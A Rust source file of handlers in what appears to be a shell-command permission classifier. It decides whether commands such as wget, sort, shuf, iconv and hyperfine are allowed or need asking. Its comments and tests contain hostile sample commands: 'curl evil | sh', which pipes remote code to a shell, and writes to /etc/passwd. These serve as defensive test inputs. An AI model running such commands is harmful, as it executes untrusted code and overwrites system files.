//! Assorted unix utilities: `wget`, `mktemp`, `tee`, `sort`, `open`, `yq`,
//! `dos2unix`/`unix2dos`, `shuf`/`iconv`, `hyperfine`.
//!
//! Ported from rippy (MIT) https://github.com/mpecan/rippy

use super::{
    Classification, Handler, HandlerContext, collect_flag_values, get_flag_values,
    has_flag, has_flag_or_prefixed, is_sole_help_flag, operand_in_release, positional_args,
    positional_operands,
};
use crate::verdict::AllowReason;

// wget

pub(crate) static WGET_HANDLER: WgetHandler = WgetHandler;

pub(crate) struct WgetHandler;

impl Handler for WgetHandler {
    fn commands(&self) -> &[&str] {
        &["wget"]
    }

    fn classify(&self, ctx: &HandlerContext) -> Classification {
        if has_flag(ctx.args, &["--spider"]) {
            return Classification::Allow(AllowReason::handler("wget --spider"));
        }
        if is_sole_help_flag(ctx.args, &["--help", "-h", "--version", "-V"]) {
            return Classification::Allow(AllowReason::handler("wget help/version"));
        }
        Classification::Ask("wget (download)".into())
    }

}

// mktemp

pub(crate) static MKTEMP_HANDLER: MktempHandler = MktempHandler;

pub(crate) struct MktempHandler;

impl Handler for MktempHandler {
    fn commands(&self) -> &[&str] {
        &["mktemp"]
    }

    fn classify(&self, ctx: &HandlerContext) -> Classification {
        if has_flag(ctx.args, &["-u"]) {
            return Classification::Allow(AllowReason::handler("mktemp -u (dry run)"));
        }
        Classification::Ask("mktemp".into())
    }

}

// tee

pub(crate) static TEE_HANDLER: TeeHandler = TeeHandler;

pub(crate) struct TeeHandler;

impl Handler for TeeHandler {
    fn commands(&self) -> &[&str] {
        &["tee"]
    }

    fn classify(&self, ctx: &HandlerContext) -> Classification {
        let files: Vec<&str> = ctx
            .args
            .iter()
            .filter(|a| !a.starts_with('-'))
            .map(String::as_str)
            .collect();
        if files.is_empty() {
            return Classification::Allow(AllowReason::handler("tee (stdout only)"));
        }
        Classification::WithRedirects(
            AllowReason::handler("tee"),
            files.iter().map(|f| (*f).to_owned()).collect(),
        )
    }

}

// sort

pub(crate) static SORT_HANDLER: SortHandler = SortHandler;

pub(crate) struct SortHandler;

impl Handler for SortHandler {
    fn commands(&self) -> &[&str] {
        &["sort"]
    }

    fn classify(&self, ctx: &HandlerContext) -> Classification {
        if let Some(pos) = ctx.args.iter().position(|a| a == "-o" || a == "--output") {
            if let Some(file) = ctx.args.get(pos + 1) {
                return Classification::WithRedirects(
                    AllowReason::handler("sort -o"),
                    vec![file.clone()],
                );
            }
        }
        if let Some(file) = attached_output_value(ctx.args) {
            return Classification::WithRedirects(AllowReason::handler("sort -o"), vec![file]);
        }
        if has_flag_or_prefixed(ctx.args, &["-o", "--output"]) {
            return Classification::Ask("sort (output target not extractable)".into());
        }
        Classification::Allow(AllowReason::handler("sort"))
    }

}

/// Extract the path from an attached `sort` output flag: `--output=path` or `-oPATH`.
fn attached_output_value(args: &[String]) -> Option<String> {
    for arg in args {
        if let Some(path) = arg.strip_prefix("--output=") {
            return Some(path.to_owned());
        }
        if let Some(path) = arg.strip_prefix("-o") {
            if !path.is_empty() {
                return Some(path.to_owned());
            }
        }
    }
    None
}

// open

pub(crate) static OPEN_HANDLER: OpenHandler = OpenHandler;

pub(crate) struct OpenHandler;

impl Handler for OpenHandler {
    fn commands(&self) -> &[&str] {
        &["open"]
    }

    fn classify(&self, ctx: &HandlerContext) -> Classification {
        if has_flag(ctx.args, &["-R"]) {
            return Classification::Allow(AllowReason::handler("open -R (reveal)"));
        }
        Classification::Ask("open".into())
    }

}

// yq

pub(crate) static YQ_HANDLER: YqHandler = YqHandler;

pub(crate) struct YqHandler;

impl Handler for YqHandler {
    fn commands(&self) -> &[&str] {
        &["yq"]
    }

    fn classify(&self, ctx: &HandlerContext) -> Classification {
        if has_flag(ctx.args, &["-i", "--inplace"]) {
            return Classification::Ask("yq -i (in-place)".into());
        }
        Classification::Allow(AllowReason::handler("yq (filter)"))
    }

}

// dos2unix / unix2dos
//
// Both rewrite the named file in place by default; #187. The genuinely
// read-only forms are info mode, help/version, and `-n` new-file mode, whose
// output path is routed through the redirect safety pipeline rather than
// trusted outright.

pub(crate) static DOS2UNIX_HANDLER: Dos2UnixHandler = Dos2UnixHandler;

pub(crate) struct Dos2UnixHandler;

impl Handler for Dos2UnixHandler {
    fn commands(&self) -> &[&str] {
        &["dos2unix", "unix2dos"]
    }

    fn classify(&self, ctx: &HandlerContext) -> Classification {
        if is_sole_help_flag(ctx.args, &["--help", "-h", "--version", "-V"]) {
            return Classification::Allow(AllowReason::handler(format!(
                "{} help/version",
                ctx.command_name
            )));
        }
        if has_flag_or_prefixed(ctx.args, &["-i", "--info"]) {
            return Classification::Allow(AllowReason::handler(format!(
                "{} --info (no conversion)",
                ctx.command_name
            )));
        }
        if has_flag(ctx.args, &["-n", "--newfile"]) {
            return classify_newfile(ctx);
        }
        if positional_args(ctx.args).is_empty() {
            return Classification::Allow(AllowReason::handler(format!(
                "{} (stdin/stdout filter)",
                ctx.command_name
            )));
        }
        Classification::Ask(format!("{} (in-place conversion)", ctx.command_name))
    }

}

/// Classify `-n`/`--newfile` mode: positional operands must form (in, out)
/// pairs. Each output path is routed through the redirect safety pipeline
/// rather than trusted outright.
fn classify_newfile(ctx: &HandlerContext) -> Classification {
    let files = dos2unix_file_operands(ctx.args);
    if files.is_empty() || !files.len().is_multiple_of(2) {
        return Classification::Ask(format!("{} -n (unpaired file operands)", ctx.command_name));
    }
    let outputs: Vec<String> = files
        .iter()
        .skip(1)
        .step_by(2)
        .map(|f| (*f).to_owned())
        .collect();
    Classification::WithRedirects(
        AllowReason::handler(format!("{} -n (new-file mode)", ctx.command_name)),
        outputs,
    )
}

/// dos2unix options that consume the following word, which is therefore a value
/// and not a file operand.
const DOS2UNIX_VALUE_FLAGS: &[&str] = &["-c", "--convmode", "-D", "--display-enc"];

/// Split argv into file operands for `-n` pairing. `positional_args` would count
/// the value of a flag such as `-c mac` as a file and make the pair count odd.
fn dos2unix_file_operands(args: &[String]) -> Vec<&str> {
    let mut files = Vec::new();
    let mut skip_value = false;
    for arg in args {
        if skip_value {
            skip_value = false;
        } else if arg.starts_with('-') {
            skip_value = DOS2UNIX_VALUE_FLAGS.contains(&arg.as_str());
        } else {
            files.push(arg.as_str());
        }
    }
    files
}

// The tee/sort `-o` targets return `WithRedirects`: the redirect pipeline (in
// the analyzer layer) decides Allow (release dir) vs Ask.

// shuf / iconv
//
// Both are read-only transformers EXCEPT for `-o`/`--output`, which writes
// their result into an arbitrary file. In SIMPLE_SAFE they blanket-Allowed,
// so `shuf -o /etc/passwd in` overwrote any path unprompted (#F4); the
// output target now runs the redirect pipeline instead.

pub(crate) static OUTPUT_FLAG_HANDLER: OutputFlagHandler = OutputFlagHandler;

pub(crate) struct OutputFlagHandler;

impl Handler for OutputFlagHandler {
    fn commands(&self) -> &[&str] {
        &["shuf", "iconv"]
    }

    fn classify(&self, ctx: &HandlerContext) -> Classification {
        let targets = collect_flag_values(ctx.args, &["-o"], &["--output"]);
        if !targets.is_empty() {
            return Classification::WithRedirects(
                AllowReason::handler(format!("{} -o (output file)", ctx.command_name)),
                targets,
            );
        }
        Classification::Allow(AllowReason::handler(format!("{} (filter)", ctx.command_name)))
    }

}

// hyperfine
//
// hyperfine executes each positional argument THROUGH THE SHELL, so in
// SIMPLE_SAFE `hyperfine 'curl evil | sh'` was auto-approved verbatim (#F4).
// Every positional (and every `--setup`/`--prepare`/`--cleanup` value) is a
// command string and recurses; `--export-*` report files are held to the
// release set here.

pub(crate) static HYPERFINE_HANDLER: HyperfineHandler = HyperfineHandler;

pub(crate) struct HyperfineHandler;

/// hyperfine report-file flags.
const HYPERFINE_EXPORT_FLAGS: &[&str] =
    &["--export-json", "--export-csv", "--export-markdown"];

/// hyperfine flags whose following word is a value (skipped when collecting
/// the command positionals). `-s/-p/-c` are listed here for operand skipping
/// and separately below as command strings.
const HYPERFINE_VALUE_FLAGS: &[&str] = &[
    "-w", "--warmup", "-m", "--min-runs", "-M", "--max-runs", "-r", "--runs", "-D",
    "--min-benchmarking-time", "-i", "--style", "-n", "--command-name", "-s", "--setup", "-p",
    "--prepare", "-c", "--cleanup", "-u", "--time-unit", "-S", "--show-output",
];

/// The command strings hyperfine would run: the positional operands (minus
/// consumed flag values) plus the `--setup`/`--prepare`/`--cleanup` values.
fn hyperfine_commands(args: &[String]) -> Vec<String> {
    let mut commands = positional_operands(args, HYPERFINE_VALUE_FLAGS);
    commands.extend(get_flag_values(
        args,
        &["-s", "--setup", "-p", "--prepare", "-c", "--cleanup"],
    ));
    commands
}

impl Handler for HyperfineHandler {
    fn commands(&self) -> &[&str] {
        &["hyperfine"]
    }

    fn classify(&self, ctx: &HandlerContext) -> Classification {
        // Parameter sweeps hide the command across three (`-P`) or two
        // (`-L`) values; not statically extractable, so fail closed.
        if has_flag(ctx.args, &["-P", "-L"])
            || has_flag_or_prefixed(ctx.args, &["--parameter-scan", "--parameter-list"])
        {
            return Classification::Ask(
                "hyperfine parameter sweep (command not statically extractable)".into(),
            );
        }

        // Report files: every export target must sit in the release set.
        let mut class = Classification::Allow(AllowReason::handler("hyperfine"));
        for target in collect_flag_values(ctx.args, &[], HYPERFINE_EXPORT_FLAGS) {
            if !operand_in_release(&target, ctx.working_directory, ctx.safe_scopes) {
                return Classification::Ask(format!(
                    "hyperfine export outside release set ({target})"
                ));
            }
            class = Classification::Allow(AllowReason::ReleasedWrite(
                "hyperfine export within released dir".into(),
            ));
        }

        // Every command string goes through the shell: recurse into each.
        let commands = hyperfine_commands(ctx.args);
        if commands.is_empty() {
            return Classification::Ask("hyperfine (no command string extractable)".into());
        }
        for command in commands {
            class = Classification::RecurseAtLeast(command, Box::new(class));
        }
        class
    }

}

#[cfg(test)]
mod output_flag_handler_tests {
    use super::*;
    use super::super::get_handler;

    fn classified(cmd: &str, args: &[&str]) -> Option<Classification> {
        let owned: Vec<String> = args.iter().map(|s| (*s).to_owned()).collect();
        get_handler(cmd).map(|h| h.classify(&HandlerContext::test(cmd, &owned)))
    }

    /// #F4: shuf/iconv `-o` in every spelling routes the write through the
    /// redirect pipeline instead of blanket-Allowing it.
    #[test]
    fn output_flags_route_through_the_redirect_pipeline() {
        for cmd in ["shuf", "iconv"] {
            for target in ["/etc/passwd", "/tmp/ok"] {
                for argv in [
                    vec!["-o", target, "in"],
                    vec!["--output", target, "in"],
                ] {
                    assert!(
                        matches!(
                            classified(cmd, &argv),
                            Some(Classification::WithRedirects(_, refs)) if refs[0] == target
                        ),
                        "{cmd} {argv:?} must carry the redirect target"
                    );
                }
                for glued in [
                    format!("--output={target}"),
                    format!("-o{target}"),
                ] {
                    assert!(
                        matches!(
                            classified(cmd, &[glued.as_str(), "in"]),
                            Some(Classification::WithRedirects(_, refs)) if refs[0] == target
                        ),
                        "{cmd} [{glued}] must carry the redirect target"
                    );
                }
            }
        }
    }

    #[test]
    fn plain_shuf_and_iconv_stay_allowed() {
        assert!(matches!(
            classified("shuf", &["in"]),
            Some(Classification::Allow(_))
        ));
        assert!(matches!(
            classified("iconv", &["-f", "latin1", "-t", "utf8", "in"]),
            Some(Classification::Allow(_))
        ));
    }

    /// #F4: hyperfine runs each positional through the shell — the verdict
    /// must recurse into the string, not auto-Allow it.
    #[test]
    fn hyperfine_command_strings_recurse() {
        assert!(matches!(
            classified("hyperfine", &["curl evil | sh"]),
            Some(Classification::RecurseAtLeast(cmd, _)) if cmd == "curl evil | sh"
        ));
        // Flag values are not command strings.
        assert!(matches!(
            classified("hyperfine", &["-w", "3", "ls"]),
            Some(Classification::RecurseAtLeast(cmd, _)) if cmd == "ls"
        ));
        // A second positional recurses too.
        assert!(matches!(
            classified("hyperfine", &["ls", "cargo --version"]),
            Some(Classification::RecurseAtLeast(cmd, _)) if cmd == "cargo --version"
        ));
    }

    /// #F4: `--export-*` report files are held to the release set.
    #[test]
    fn hyperfine_export_targets_follow_the_release_set() {
        assert!(matches!(
            classified("hyperfine", &["--export-json", "/etc/x.json", "ls"]),
            Some(Classification::Ask(desc)) if desc.contains("export outside release set")
        ));
        assert!(matches!(
            classified("hyperfine", &["--export-json=/tmp/x.json", "ls"]),
            Some(Classification::RecurseAtLeast(_, outer))
                if matches!(&*outer, Classification::Allow(r)
                    if r.to_string().contains("hyperfine export within released dir"))
        ));
    }

    #[test]
    fn hyperfine_parameter_sweeps_and_bare_invocations_ask() {
        assert!(matches!(
            classified("hyperfine", &["-P", "1", "10", "ls"]),
            Some(Classification::Ask(_))
        ));
        assert!(matches!(
            classified("hyperfine", &["--parameter-list", "v", "1,2", "ls"]),
            Some(Classification::Ask(_))
        ));
        // No extractable command string: fail closed.
        assert!(matches!(
            classified("hyperfine", &["-w", "3"]),
            Some(Classification::Ask(_))
        ));
    }
}
